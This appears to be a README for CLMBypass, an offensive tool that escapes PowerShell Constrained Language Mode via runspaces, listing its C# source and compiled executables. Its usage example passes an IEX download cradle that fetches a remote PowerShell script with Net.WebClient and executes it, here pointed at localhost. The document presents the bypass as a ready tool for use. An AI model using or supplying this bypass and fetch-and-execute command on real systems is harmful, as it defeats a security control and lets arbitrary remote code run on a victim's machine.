# CLMBypass

Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/) article.

### contents
- Program.cs
  - C# source code
- CLMB.exe
  - Compiled as PE32 .NET Framework 4.5
- CLMBypass.exe
  - Compiled as PE32 .NET Framework 4.0
## usage
```
C:\Users\CLMUser\Downloads>.\CLMB.exe "IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')"
```
